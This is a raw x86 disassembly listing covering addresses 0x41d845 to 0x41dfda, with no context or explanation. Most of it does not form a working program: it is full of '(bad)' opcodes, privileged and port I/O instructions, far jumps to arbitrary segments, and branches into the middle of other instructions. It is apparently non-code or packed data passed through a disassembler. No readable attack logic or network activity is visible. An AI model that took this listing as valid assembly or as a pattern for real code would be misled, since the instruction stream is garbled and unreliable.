  41d845:	call   0xf6e43abd
  41d84a:	ds pop esi
  41d84c:	xchg   edi,eax
  41d84d:	test   eax,0x82d4b8bd
  41d852:	push   eax
  41d853:	add    eax,0xe7994688
  41d858:	jnp    0x41d846
  41d85a:	ja     0x41d7ee
  41d85c:	pop    ds
  41d85d:	rcr    BYTE PTR ds:0x4bc2c7f3,1
  41d863:	sbb    BYTE PTR [edi+0x24e8bc11],dh
  41d869:	mov    edi,0x1ca2799c
  41d86e:	ins    DWORD PTR es:[edi],dx
  41d86f:	dec    esp
  41d870:	pop    esp
  41d871:	add    BYTE PTR [edi-0x1e],bh
  41d874:	mov    al,ds:0xf0456b52
  41d879:	jg     0x41d8a7
  41d87b:	(bad)  
  41d87c:	in     eax,0x86
  41d87e:	adc    DWORD PTR [edx-0x1a],ebp
  41d881:	xchg   edx,eax
  41d882:	cmp    bl,cl
  41d884:	leave  
  41d885:	test   eax,0xf8ebaa7
  41d88a:	std    
  41d88b:	retf   
  41d88c:	push   ecx
  41d88d:	shr    BYTE PTR [ebx-0x3c07925],0x85
  41d894:	and    BYTE PTR [edi+eax*1+0x5d],0xd6
  41d899:	mov    DWORD PTR [ebp+edx*8-0xa],esi
  41d89d:	loope  0x41d919
  41d89f:	jle    0x41d8be
  41d8a1:	loope  0x41d867
  41d8a3:	int    0xf3
  41d8a5:	dec    ebp
  41d8a6:	outs   dx,BYTE PTR ds:[esi]
  41d8a7:	inc    ebx
  41d8a8:	add    eax,0x506867f2
  41d8ad:	lods   eax,DWORD PTR ds:[esi]
  41d8ae:	sti    
  41d8af:	mov    al,ds:0x2d89846b
  41d8b4:	inc    esi
  41d8b5:	repnz push edi
  41d8b7:	and    bh,dh
  41d8b9:	and    DWORD PTR [edx-0x77f7f365],ebp
  41d8bf:	mov    esp,0x4762e188
  41d8c4:	repnz enter 0x425,0x36
  41d8c9:	call   0xe792:0xe6f28742
  41d8d0:	or     bh,BYTE PTR [edx+eax*4-0x56]
  41d8d4:	sbb    BYTE PTR [ebx],dl
  41d8d6:	stc    
  41d8d7:	jp     0x41d871
  41d8d9:	pushf  
  41d8da:	bnd lock jmp 0x41d94f
  41d8de:	(bad)  
  41d8df:	jle    0x41d8dc
  41d8e1:	jp     0x41d8fb
  41d8e3:	sub    DWORD PTR [esp+eiz*2+0x5d],esi
  41d8e7:	shl    DWORD PTR [edx+0x16c25b11],cl
  41d8ed:	retf   0x5ab7
  41d8f0:	pop    es
  41d8f1:	sub    DWORD PTR [esi+0x75a15678],esi
  41d8f7:	mov    cl,BYTE PTR [edx]
  41d8f9:	sbb    BYTE PTR [ebx-0x7],al
  41d8fc:	sub    ecx,0x24eeaa43
  41d902:	rcl    BYTE PTR [esi],cl
  41d904:	cdq    
  41d905:	dec    esp
  41d906:	fs dec ebp
  41d908:	inc    esp
  41d909:	call   0xe6e8:0x3d941d05
  41d910:	and    edx,DWORD PTR [ebx+0x43]
  41d913:	xor    BYTE PTR [eax-0x51],dl
  41d916:	push   es
  41d917:	shl    DWORD PTR ds:0x6403e259,1
  41d91d:	mov    cl,ch
  41d91f:	push   eax
  41d920:	mov    ch,0x53
  41d922:	outs   dx,BYTE PTR ds:[esi]
  41d923:	rcr    BYTE PTR [edx],1
  41d925:	xor    eax,0x2db2bf64
  41d92a:	(bad)  
  41d92b:	pop    ecx
  41d92c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d92d:	and    esp,0xffffffc0
  41d930:	aas    
  41d931:	xchg   ebx,eax
  41d932:	inc    eax
  41d933:	jle    0x41d90c
  41d935:	jmp    0x8fc4:0x7ca1392f
  41d93c:	fidivr WORD PTR [ebx+0x395ca3c1]
  41d942:	rcr    DWORD PTR [esi-0x5],0xe8
  41d946:	(bad)  
  41d948:	xor    bl,BYTE PTR ds:0xb565215b
  41d94e:	sbb    BYTE PTR ds:0xf701815e,ah
  41d954:	loopne 0x41d8fa
  41d956:	adc    edi,0x18
  41d959:	sub    DWORD PTR [ebp-0xb],0x602617d7
  41d960:	test   al,0xab
  41d962:	icebp  
  41d963:	dec    ecx
  41d964:	inc    esi
  41d965:	enter  0xc5a6,0x2e
  41d969:	imul   esp,DWORD PTR [edi],0x3c658018
  41d96f:	add    bh,BYTE PTR [eax]
  41d971:	rcl    DWORD PTR [edx+ebx*1+0xdb844b],0xce
  41d979:	xchg   ecx,eax
  41d97a:	mov    ds:0xda18b09f,al
  41d97f:	xor    dl,BYTE PTR [edx+0x51b8e72c]
  41d985:	mov    edx,0x2434d828
  41d98a:	rol    DWORD PTR [eax],1
  41d98c:	imul   esp,DWORD PTR ds:0xaa3623dd,0x4bfa9cf5
  41d996:	push   ds
  41d997:	adc    eax,0x1c34a79
  41d99c:	cld    
  41d99d:	cli    
  41d99e:	retf   
  41d99f:	pop    ecx
  41d9a0:	push   eax
  41d9a1:	sar    DWORD PTR [edx+esi*4-0x28],0xe2
  41d9a6:	(bad)
  41d9a9:	sbb    DWORD PTR [esi],esi
  41d9ab:	or     bh,BYTE PTR [ebx]
  41d9ad:	mov    ch,0x55
  41d9af:	dec    edx
  41d9b0:	(bad)  
  41d9b1:	jb     0x41d9ae
  41d9b3:	push   eax
  41d9b4:	jmp    0x41da23
  41d9b6:	push   ss
  41d9b7:	outs   dx,BYTE PTR ds:[esi]
  41d9b8:	dec    eax
  41d9b9:	mov    al,BYTE PTR [edx+eiz*8+0x2]
  41d9bd:	inc    ecx
  41d9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9bf:	mov    bh,0xa5
  41d9c1:	js     0x41da28
  41d9c3:	add    ebp,DWORD PTR [ebx]
  41d9c5:	pop    esp
  41d9c6:	pop    ecx
  41d9c7:	bound  edx,QWORD PTR [eax-0x328e0b8e]
  41d9cd:	aas    
  41d9ce:	xchg   ebp,eax
  41d9cf:	stos   BYTE PTR es:[edi],al
  41d9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9d1:	pop    ds
  41d9d2:	push   ds
  41d9d3:	push   esp
  41d9d4:	adc    al,0xb1
  41d9d6:	add    DWORD PTR [ebp+0x45255d26],ebp
  41d9dc:	scas   eax,DWORD PTR es:[edi]
  41d9dd:	sub    eax,0x21f0eb5f
  41d9e2:	pop    ebp
  41d9e3:	rcr    dl,cl
  41d9e5:	cli    
  41d9e6:	add    DWORD PTR [ebp+eiz*1+0x8],ebp
  41d9ea:	mov    ss,WORD PTR [edx-0x55b36d31]
  41d9f0:	and    al,0xa6
  41d9f2:	mov    ecx,0xc3d7e1f3
  41d9f7:	sti    
  41d9f8:	out    0xab,eax
  41d9fa:	data16 stc 
  41d9fc:	jge    0x41da6c
  41d9fe:	sub    ch,BYTE PTR [edi]
  41da00:	jl     0x41d9e8
  41da02:	icebp  
  41da03:	xchg   ebp,eax
  41da04:	loop   0x41d9b4
  41da06:	or     bl,cl
  41da08:	lock mov cl,BYTE PTR [ecx]
  41da0b:	jge    0x41d9f8
  41da0d:	push   0x72ab2818
  41da12:	es mov ebx,0xe3c4c9e8
  41da18:	test   BYTE PTR [eax-0x26336602],ah
  41da1e:	pop    edi
  41da1f:	jp     0x41da3b
  41da21:	adc    BYTE PTR [edi+0x31f2795c],ch
  41da27:	fs call 0x170d:0x764f9175
  41da2f:	mov    WORD PTR [ecx+0x5b],fs
  41da32:	inc    edi
  41da33:	(bad)  
  41da34:	sbb    ebx,DWORD PTR [esi+0x2c41acff]
  41da3a:	cmc    
  41da3b:	imul   DWORD PTR [eax+edx*4-0x58]
  41da3f:	inc    eax
  41da40:	lock mov bh,BYTE PTR [esi+0x7438e23a]
  41da47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da48:	js     0x41d9f4
  41da4a:	clc    
  41da4b:	scas   al,BYTE PTR es:[edi]
  41da4c:	jmp    DWORD PTR [esi-0x5c]
  41da4f:	mov    dl,0xd1
  41da51:	adc    eax,0xc4890d1d
  41da56:	in     al,dx
  41da57:	mov    ch,0x80
  41da59:	loopne 0x41da57
  41da5b:	jb     0x41dab8
  41da5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da5e:	outs   dx,DWORD PTR ds:[esi]
  41da5f:	adc    ecx,0xffffffea
  41da62:	mov    ebx,0xbb254d83
  41da67:	sbb    eax,0xb1ad8a74
  41da6c:	mov    ebx,0x735ff06e
  41da71:	and    eax,0x31996bf8
  41da76:	pushf  
  41da77:	xor    edx,edi
  41da79:	fucom  st(2)
  41da7b:	add    dl,BYTE PTR [bp+di-0x3ccf]
  41da80:	in     eax,0xe1
  41da82:	dec    ecx
  41da83:	fist   WORD PTR [eax]
  41da85:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41da87:	xor    BYTE PTR [edx+0x2a71e55],0x6a
  41da8e:	je     0x41da56
  41da90:	jo     0x41da15
  41da92:	mov    edi,0xce469705
  41da97:	and    ecx,edx
  41da99:	pop    esp
  41da9a:	mov    es,WORD PTR [ebp+esi*8+0x65]
  41da9e:	mov    esp,0xd6152599
  41daa3:	jge    0x41da67
  41daa5:	lods   al,BYTE PTR ds:[esi]
  41daa6:	mov    ebx,cs
  41daa8:	ds or  eax,0x25e9620
  41daae:	ja     0x41db16
  41dab0:	sub    ah,al
  41dab2:	pop    ecx
  41dab3:	repz push edi
  41dab5:	shl    dl,0x5e
  41dab8:	fwait
  41dab9:	xor    al,0x94
  41dabb:	add    dh,BYTE PTR [ebx-0x1]
  41dabe:	out    0x54,eax
  41dac0:	fstp   DWORD PTR [ebp-0x1a]
  41dac3:	ret    
  41dac4:	mov    bh,0xe2
  41dac6:	add    DWORD PTR [esi],eax
  41dac8:	shr    DWORD PTR [ebp+0x67],cl
  41dacb:	stos   BYTE PTR es:[edi],al
  41dacc:	repnz cmc 
  41dace:	push   ebp
  41dacf:	xchg   edi,eax
  41dad0:	test   bl,bl
  41dad2:	lods   eax,DWORD PTR ds:[esi]
  41dad3:	test   bh,ch
  41dad5:	out    dx,al
  41dad6:	fucomp st(4)
  41dad8:	ins    DWORD PTR es:[edi],dx
  41dad9:	ins    BYTE PTR es:[edi],dx
  41dada:	push   eax
  41dadb:	jg     0x41daac
  41dadd:	pusha  
  41dade:	or     al,0x80
  41dae0:	pop    ss
  41dae1:	mov    eax,ds:0x977e1e2e
  41dae6:	(bad)  
  41dae7:	fiadd  WORD PTR [edi-0x3b]
  41daea:	aam    0x5c
  41daec:	das    
  41daed:	retf   0xb5c4
  41daf0:	jl     0x41db23
  41daf2:	fs aas 
  41daf4:	mov    di,0xfc31
  41daf8:	(bad)  
  41dafa:	xchg   si,ax
  41dafc:	inc    esi
  41dafd:	lods   al,BYTE PTR ds:[esi]
  41dafe:	inc    esp
  41daff:	ret    
  41db00:	sbb    eax,0x309800ee
  41db05:	je     0x41db45
  41db07:	sbb    al,BYTE PTR [ecx+0x1b2a0bf6]
  41db0d:	(bad)  
  41db0e:	call   0xbbef92f1
  41db13:	and    al,0x8
  41db15:	cli    
  41db16:	mov    BYTE PTR [edi],ah
  41db18:	cwde   
  41db19:	add    DWORD PTR [ecx-0x73],edx
  41db1c:	lea    esi,[eax-0x41]
  41db1f:	inc    ebx
  41db20:	mov    ds:0x9e3d5a5b,eax
  41db25:	pushf  
  41db26:	pop    esi
  41db27:	xor    eax,0xbf657c58
  41db2c:	pop    ecx
  41db2d:	inc    edx
  41db2e:	inc    eax
  41db2f:	jg     0x41db0d
  41db31:	mov    bh,0x50
  41db33:	adc    ah,BYTE PTR [ecx]
  41db35:	and    al,0x62
  41db37:	sbb    eax,0xa6fa21f1
  41db3c:	cs cdq 
  41db3e:	mul    BYTE PTR [edx+0x63]
  41db41:	div    BYTE PTR [eax-0x5b4647e7]
  41db47:	inc    esp
  41db48:	int3   
  41db49:	add    bh,BYTE PTR [ebp-0x604145ca]
  41db4f:	or     DWORD PTR [ebx+0x6f3da0bd],0x4c5ef408
  41db59:	cld    
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	mov    dh,bh
  41db5d:	mul    BYTE PTR [ebp+0x27855bc6]
  41db63:	dec    ebp
  41db64:	push   ebp
  41db65:	fwait
  41db66:	mov    dh,0xaa
  41db68:	and    DWORD PTR [ebp+0x2057c98a],edx
  41db6e:	mov    al,0x33
  41db70:	cmp    edx,DWORD PTR ds:0xc82633f5
  41db76:	mov    ebp,0x331c82ac
  41db7b:	xchg   esp,eax
  41db7c:	mov    BYTE PTR [ebp+0x9],cl
  41db7f:	call   FWORD PTR [esi]
  41db81:	dec    esp
  41db82:	(bad)  [ecx+0x17]
  41db85:	sahf   
  41db86:	lock popa 
  41db88:	shl    esp,0xe1
  41db8b:	mov    ecx,0x251a7605
  41db90:	in     eax,0x97
  41db92:	stos   DWORD PTR es:[edi],eax
  41db93:	test   al,0x5f
  41db95:	jns    0x41db49
  41db97:	mov    BYTE PTR es:[edx+eax*1+0x25ea29c3],bl
  41db9f:	mov    al,ds:0x9e2cd513
  41dba4:	ret    0x482a
  41dba7:	adc    BYTE PTR [edx+0x5d],0x40
  41dbab:	xor    bh,0xf1
  41dbae:	(bad)  
  41dbaf:	shr    DWORD PTR [eax-0x25],0x6e
  41dbb3:	in     al,dx
  41dbb4:	or     ah,BYTE PTR [ecx+0x1]
  41dbb7:	xor    BYTE PTR [ebp+0x6daecfe7],al
  41dbbd:	jp     0x41dbb1
  41dbbf:	das    
  41dbc0:	xchg   esp,eax
  41dbc1:	jecxz  0x41dbd1
  41dbc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbc4:	stc    
  41dbc5:	inc    edx
  41dbc6:	jmp    0x418e:0xc9b60d24
  41dbcd:	dec    esi
  41dbce:	inc    eax
  41dbcf:	sahf   
  41dbd0:	fstp   QWORD PTR [edi+0x5c]
  41dbd3:	in     eax,dx
  41dbd4:	add    DWORD PTR [ecx],edx
  41dbd6:	xor    BYTE PTR [edx-0x459ebee0],0xb9
  41dbdd:	sub    eax,0xe2086c45
  41dbe2:	fdivr  QWORD PTR [edi+0x6529f3f7]
  41dbe8:	punpckhwd mm1,QWORD PTR [eax-0x80]
  41dbec:	je     0x41db70
  41dbee:	xchg   esi,eax
  41dbef:	pop    ebx
  41dbf0:	fs push 0xffffffc7
  41dbf3:	aas    
  41dbf4:	or     al,0xef
  41dbf6:	xor    eax,0x79c07102
  41dbfb:	js     0x41dc3e
  41dbfd:	lahf   
  41dbfe:	out    0xfd,al
  41dc00:	rcl    BYTE PTR [eax-0x573a0644],1
  41dc06:	mov    eax,0xe2a42142
  41dc0b:	adc    al,0x13
  41dc0d:	(bad)  
  41dc0e:	popf   
  41dc0f:	scas   al,BYTE PTR es:[edi]
  41dc10:	pop    esi
  41dc11:	inc    edi
  41dc12:	ds test bl,dh
  41dc15:	clc    
  41dc16:	loopne 0x41dbdb
  41dc18:	(bad)  
  41dc19:	cmp    DWORD PTR [edx],esi
  41dc1b:	and    eax,0xa8e2d67f
  41dc20:	dec    ebx
  41dc21:	daa    
  41dc22:	call   0xb1e:0x1c95cac2
  41dc29:	rol    ebx,cl
  41dc2b:	hlt    
  41dc2c:	push   esi
  41dc2d:	add    al,0x72
  41dc2f:	nop
  41dc30:	popf   
  41dc31:	mov    ds:0xa6c8541c,eax
  41dc36:	shl    DWORD PTR [ecx],1
  41dc38:	addr16 xor eax,0x33af5b92
  41dc3e:	lahf   
  41dc3f:	and    BYTE PTR [ecx+0x6b],bl
  41dc42:	mov    ch,0xe
  41dc44:	bound  edx,QWORD PTR [ebx+0x62313099]
  41dc4a:	xchg   ecx,eax
  41dc4b:	dec    esp
  41dc4c:	popa   
  41dc4d:	or     eax,0xfb41277a
  41dc52:	jnp    0x41dc0f
  41dc54:	pop    eax
  41dc55:	ins    BYTE PTR es:[edi],dx
  41dc56:	fisubr DWORD PTR es:[eax+0x57]
  41dc5a:	push   ebx
  41dc5b:	outs   dx,BYTE PTR ds:[esi]
  41dc5c:	lods   eax,DWORD PTR ds:[esi]
  41dc5d:	push   0xba5f4a00
  41dc62:	sub    eax,0x7395e3f2
  41dc67:	sbb    DWORD PTR [edx+ebp*1-0x2a],edx
  41dc6b:	mov    ds:0xa8ea6b3e,eax
  41dc70:	jp     0x41dca0
  41dc72:	xchg   ebx,eax
  41dc73:	sbb    al,0x79
  41dc75:	xchg   edi,eax
  41dc76:	push   0x25
  41dc78:	mov    eax,ds:0x11a24d28
  41dc7d:	shl    DWORD PTR [edi],1
  41dc7f:	mov    eax,0x4a87feff
  41dc84:	sbb    eax,0x57f2f055
  41dc89:	hlt    
  41dc8a:	xchg   ecx,eax
  41dc8b:	enter  0xea0,0x8c
  41dc8f:	cs or  bl,cl
  41dc92:	test   BYTE PTR [edi],0xd6
  41dc95:	js     0x41dc42
  41dc97:	(bad)  
  41dc99:	jl     0x41dd19
  41dc9b:	into   
  41dc9c:	jecxz  0x41dd0c
  41dc9e:	es in  eax,dx
  41dca0:	pop    ds
  41dca1:	pop    edi
  41dca2:	test   DWORD PTR [eax+0x4f3b7230],esi
  41dca8:	jmp    0x31dfa657
  41dcad:	data16 jecxz 0x41dd1c
  41dcb0:	sbb    edx,DWORD PTR [edi]
  41dcb2:	or     DWORD PTR [esi+esi*2+0x1f751afc],edi
  41dcb9:	xchg   ah,dl
  41dcbb:	adc    cl,BYTE PTR [edi]
  41dcbd:	dec    ebp
  41dcbe:	out    dx,eax
  41dcbf:	push   eax
  41dcc0:	cdq    
  41dcc1:	dec    esp
  41dcc2:	xchg   ebx,eax
  41dcc3:	cmp    dl,al
  41dcc5:	popa   
  41dcc6:	outs   dx,BYTE PTR ds:[esi]
  41dcc7:	inc    ebp
  41dcc8:	and    eax,0x353741d9
  41dccd:	jle    0x41dc74
  41dccf:	mov    dh,0x72
  41dcd1:	fdiv   st(5),st
  41dcd3:	jnp    0x41dca6
  41dcd5:	mov    edx,0xeef56369
  41dcda:	and    al,0xbc
  41dcdc:	or     eax,0x73308640
  41dce1:	push   ecx
  41dce2:	iret   
  41dce3:	mov    WORD PTR [ebp+0x6804902d],ds
  41dce9:	sub    al,0x16
  41dceb:	test   DWORD PTR [ebp+0x57],esp
  41dcee:	(bad)  
  41dcef:	mov    esi,0x309a9adf
  41dcf4:	dec    ebx
  41dcf6:	rcl    DWORD PTR [ebx+edx*8-0x21],cl
  41dcfa:	xor    DWORD PTR [edx-0x41],edi
  41dcfd:	pop    ecx
  41dcfe:	ins    DWORD PTR es:[edi],dx
  41dcff:	push   es
  41dd00:	jecxz  0x41dc87
  41dd02:	mov    dl,0xde
  41dd04:	out    dx,eax
  41dd05:	loopne 0x41dd75
  41dd07:	mov    esp,0x513defc0
  41dd0c:	xor    al,0xdf
  41dd0f:	sbb    al,0xfc
  41dd11:	aad    0x2b
  41dd13:	hlt    
  41dd14:	jmp    0x41dd6a
  41dd16:	shl    DWORD PTR [ecx-0x10],1
  41dd19:	cmp    BYTE PTR ds:0xc2a19eb,ch
  41dd1f:	or     DWORD PTR ds:0x5ff0f52a,0xffffffca
  41dd26:	ds ins BYTE PTR es:[edi],dx
  41dd28:	mov    dl,0x61
  41dd2a:	ss (bad) 
  41dd2c:	mov    edi,0x2e38da15
  41dd31:	dec    esi
  41dd33:	fbstp  TBYTE PTR [ecx-0x73]
  41dd36:	lods   eax,DWORD PTR ds:[esi]
  41dd37:	inc    esi
  41dd38:	sub    DWORD PTR [ebp-0x32],esi
  41dd3b:	repnz and edi,DWORD PTR [ecx+0x442da77d]
  41dd42:	add    al,0xe9
  41dd44:	ins    BYTE PTR es:[edi],dx
  41dd45:	push   0xbf1a712e
  41dd4a:	sbb    bh,BYTE PTR [ecx]
  41dd4c:	pop    ebx
  41dd4d:	sub    al,0x0
  41dd4f:	(bad)  
  41dd50:	fldcw  WORD PTR [esi]
  41dd52:	xor    al,dl
  41dd54:	mov    ebp,0xa611484e
  41dd59:	loope  0x41dd90
  41dd5b:	or     eax,ebp
  41dd5d:	outs   dx,BYTE PTR ds:[esi]
  41dd5e:	mov    BYTE PTR gs:[ecx+esi*1-0x3e],ah
  41dd63:	adc    DWORD PTR [ecx+0x1b1fdc53],ebp
  41dd69:	cmp    dl,0xce
  41dd6c:	sar    BYTE PTR [ecx+eiz*1-0x78],cl
  41dd70:	jnp    0x41dda0
  41dd72:	push   edi
  41dd73:	jne    0x41dd34
  41dd75:	sbb    ch,bh
  41dd77:	xchg   esp,eax
  41dd78:	inc    esi
  41dd79:	add    al,0x47
  41dd7b:	test   al,0xb7
  41dd7d:	in     eax,dx
  41dd7e:	(bad)  
  41dd80:	fsub   QWORD PTR [ebx+0x8]
  41dd83:	stc    
  41dd84:	and    eax,0x3611f362
  41dd89:	push   esp
  41dd8a:	sub    eax,0x726c9d85
  41dd8f:	repz and al,0x3
  41dd92:	loop   0x41dd79
  41dd94:	push   ds
  41dd95:	xchg   DWORD PTR [eax],ebp
  41dd97:	cmp    al,0xa0
  41dd99:	push   eax
  41dd9a:	addr16 aad 0x1f
  41dd9d:	cmp    edx,DWORD PTR [esi+0x34d38e4b]
  41dda3:	mov    esi,DWORD PTR ds:0x8aacb91a
  41dda9:	ja     0x41ddb6
  41ddab:	lods   eax,DWORD PTR ds:[esi]
  41ddac:	xor    al,BYTE PTR [edi+0x64]
  41ddaf:	rcr    BYTE PTR ds:0xf56352af,0xe8
  41ddb6:	shl    BYTE PTR [esi+0x69],0xf1
  41ddba:	fs int3 
  41ddbc:	es daa 
  41ddbe:	sub    eax,DWORD PTR [ebx]
  41ddc0:	push   ebx
  41ddc1:	push   0x376fdb92
  41ddc6:	lods   al,BYTE PTR ds:[esi]
  41ddc7:	hlt    
  41ddc8:	test   DWORD PTR [ecx-0x65],0x7aa7e26b
  41ddcf:	popf   
  41ddd0:	cmp    ch,cl
  41ddd2:	xchg   DWORD PTR [ebp+0x4601194d],edx
  41ddd8:	std    
  41ddd9:	xchg   ebx,eax
  41ddda:	adc    BYTE PTR [ebx],dh
  41dddc:	xchg   ebp,eax
  41dddd:	out    dx,al
  41ddde:	or     bl,BYTE PTR [edx+0x527235aa]
  41dde4:	adc    BYTE PTR [ebx],dl
  41dde6:	mov    cl,0x17
  41dde8:	adc    eax,DWORD PTR [ebx+edi*8-0x31050f9f]
  41ddef:	sti    
  41ddf0:	jmp    0x557d802a
  41ddf5:	mov    eax,DWORD PTR [edx+0x45e9f341]
  41ddfb:	ss jnp 0x41de39
  41ddfe:	or     esp,esp
  41de00:	pop    esi
  41de01:	in     eax,0x4b
  41de03:	mov    ecx,0x6c3b0e0f
  41de08:	inc    ebx
  41de09:	push   0x16
  41de0b:	add    al,0xbb
  41de0d:	jne    0x41ddbf
  41de0f:	adc    eax,0xba1fe4c
  41de14:	or     eax,0x2abcbbb5
  41de19:	mov    ebx,0x702af78
  41de1e:	and    BYTE PTR [eax+0x73f68e3f],0xb4
  41de25:	sti    
  41de26:	aas    
  41de27:	sub    eax,0x1dcd3667
  41de2c:	and    DWORD PTR [ebp+0x24],0x434cbb4
  41de33:	bound  ecx,QWORD PTR [edi]
  41de35:	nop
  41de36:	jl     0x41de9d
  41de38:	and    ecx,ebp
  41de3a:	xchg   ebp,eax
  41de3b:	jmp    0x41ddf8
  41de3d:	inc    esi
  41de3e:	test   ebx,esp
  41de40:	push   esp
  41de41:	adc    al,0xaf
  41de43:	int3   
  41de44:	add    dl,BYTE PTR [ecx+ecx*8]
  41de47:	inc    esp
  41de48:	(bad)  ds:0x53c5de2a
  41de4e:	mov    ah,0x92
  41de50:	adc    BYTE PTR [ecx+0x690912f1],0x74
  41de57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de58:	stc    
  41de59:	pop    ecx
  41de5a:	cld    
  41de5b:	in     eax,0xfd
  41de5d:	mov    al,0xcb
  41de5f:	xor    DWORD PTR [esi+eax*8+0x2e337304],0x5d
  41de67:	daa    
  41de68:	fs hlt 
  41de6a:	adc    eax,DWORD PTR [eax-0x7ba75255]
  41de70:	daa    
  41de71:	inc    esp
  41de72:	aaa    
  41de73:	pop    ebx
  41de74:	outs   dx,BYTE PTR ds:[esi]
  41de75:	xchg   ebp,eax
  41de76:	in     eax,dx
  41de77:	lds    ebp,FWORD PTR [edx-0x42bb042c]
  41de7d:	enter  0x5991,0x60
  41de81:	adc    edx,DWORD PTR [ecx]
  41de83:	ja     0x41de21
  41de85:	mov    al,ds:0x9d46fdcb
  41de8a:	inc    eax
  41de8b:	popw   es
  41de8d:	sbb    eax,0xdd8967df
  41de92:	jnp    0x41de88
  41de94:	mov    ss,WORD PTR [eax-0x1351f4a2]
  41de9a:	dec    ebp
  41de9b:	lss    ebp,FWORD PTR [esp+ecx*8-0x74]
  41dea0:	fisttp WORD PTR [eax+ebp*4]
  41dea3:	cmp    al,BYTE PTR [edx+0x70]
  41dea6:	dec    ebx
  41dea7:	lahf   
  41dea8:	lods   al,BYTE PTR ds:[esi]
  41dea9:	mov    al,ds:0x57408c02
  41deae:	das    
  41deaf:	lea    edi,[esi-0x2e]
  41deb2:	and    al,0xf5
  41deb4:	imul   eax,DWORD PTR ds:0x9a2a95fd,0x5b
  41debb:	leave  
  41debc:	adc    al,0x6f
  41debf:	imul   DWORD PTR [edi-0x39]
  41dec2:	jle    0x41de4d
  41dec4:	adc    DWORD PTR [ecx-0x3c],0x7e
  41dec8:	cld    
  41dec9:	adc    DWORD PTR [edx-0x2e9e8836],0xb633a680
  41ded3:	shl    DWORD PTR [ebx-0x14],0xf3
  41ded7:	mov    edx,0x53dcd94f
  41dedc:	jae    0x41ded6
  41dede:	outs   dx,BYTE PTR ds:[esi]
  41dedf:	xchg   DWORD PTR [bp+di],edi
  41dee2:	mov    edx,0xbabefe1f
  41dee7:	aaa    
  41dee8:	sbb    eax,0x7d756767
  41deed:	dec    esi
  41deee:	ret    0xce5d
  41def1:	loopne 0x41df33
  41def3:	lahf   
  41def4:	push   esp
  41def5:	xor    BYTE PTR [edi-0x27c9e917],0xfa
  41defc:	xchg   edi,eax
  41defd:	or     al,BYTE PTR [ebx+ebp*2]
  41df00:	fdiv   DWORD PTR [ecx]
  41df02:	add    edi,DWORD PTR [edi]
  41df04:	add    edx,ecx
  41df06:	inc    ecx
  41df07:	std    
  41df08:	jns    0x41debb
  41df0a:	(bad)  
  41df0b:	xchg   esi,eax
  41df0c:	aas    
  41df0d:	mov    dl,0x81
  41df0f:	dec    ebp
  41df10:	jb     0x41deb0
  41df12:	scas   al,BYTE PTR es:[edi]
  41df13:	mov    dl,0x14
  41df15:	js     0x41df14
  41df17:	dec    edi
  41df18:	dec    eax
  41df19:	les    ecx,FWORD PTR [ebx-0x57]
  41df1c:	mov    bl,0xff
  41df1e:	cmp    eax,0x1be74f7
  41df23:	mov    DWORD PTR fs:[ecx+0x24],esi
  41df27:	xor    BYTE PTR [eax-0x7b],al
  41df2a:	add    BYTE PTR [ebx-0x2b],0x3
  41df2e:	fcomp  QWORD PTR [ecx+0x581e1e7]
  41df34:	mov    esp,0xe48949f7
  41df39:	retf   
  41df3a:	cs je  0x41df69
  41df3d:	push   ecx
  41df3e:	(bad)  
  41df3f:	enter  0xe28f,0x33
  41df43:	sub    BYTE PTR [edx+0x6c],cl
  41df46:	cmp    DWORD PTR fs:[eax-0x7d],ebp
  41df4a:	out    dx,eax
  41df4b:	lea    edi,[eax+0x67f9ee3d]
  41df51:	sahf   
  41df52:	mov    edx,DWORD PTR [edi-0x68c4da21]
  41df58:	pushf  
  41df59:	shl    BYTE PTR [ebx],1
  41df5b:	icebp  
  41df5c:	adc    al,0xe5
  41df5e:	in     eax,dx
  41df5f:	aad    0x35
  41df61:	inc    edx
  41df62:	mov    ss,WORD PTR [ebx]
  41df64:	jg     0x41dfb1
  41df66:	out    dx,eax
  41df67:	push   0x25
  41df69:	and    ecx,DWORD PTR [edx+ebx*1]
  41df6c:	mov    esi,0x7cbc8585
  41df71:	sti    
  41df72:	sbb    edi,DWORD PTR [edx+0x33]
  41df75:	imul   esi,DWORD PTR [esi],0xffffffa0
  41df78:	scas   eax,DWORD PTR es:[edi]
  41df79:	sub    bl,dl
  41df7b:	rcl    BYTE PTR [esi],cl
  41df7d:	(bad)  
  41df7f:	mov    cl,0xd2
  41df81:	add    edx,ecx
  41df83:	or     BYTE PTR [esi+edx*8],ch
  41df86:	mov    dh,0x42
  41df88:	cmp    BYTE PTR [ebx-0x7ac61020],cl
  41df8e:	pop    es
  41df8f:	xor    al,ah
  41df91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df92:	mov    eax,0xffaef704
  41df97:	xor    al,0xa4
  41df99:	adc    al,0xa0
  41df9b:	sub    bh,BYTE PTR [esi+0x49039433]
  41dfa1:	stos   BYTE PTR es:[edi],al
  41dfa2:	arpl   WORD PTR [esi],ax
  41dfa4:	jge    0x41df75
  41dfa6:	sub    DWORD PTR [edi],0xff899d50
  41dfac:	mov    bl,0xd3
  41dfae:	xlat   BYTE PTR ds:[ebx]
  41dfaf:	dec    esp
  41dfb0:	pushf  
  41dfb1:	mov    WORD PTR [ebx+0x635dcca7],ss
  41dfb7:	aaa    
  41dfb8:	xor    eax,0xb2e5cf77
  41dfbd:	or     edi,DWORD PTR [edx-0x7d6de3a2]
  41dfc3:	stos   BYTE PTR es:[edi],al
  41dfc4:	cs fwait
  41dfc6:	mov    ebx,0xce13472e
  41dfcb:	scas   eax,DWORD PTR es:[edi]
  41dfcc:	jnp    0x41e01f
  41dfce:	lds    eax,FWORD PTR [ecx+eax*2]
  41dfd1:	bound  esi,QWORD PTR [ebx]
  41dfd3:	xor    al,0xb6
  41dfd5:	mov    ah,0xb5
  41dfd7:	daa    
  41dfd8:	outs   dx,DWORD PTR ds:[esi]
  41dfd9:	out    dx,eax
  41dfda:	fcmovnbe st,st(1)
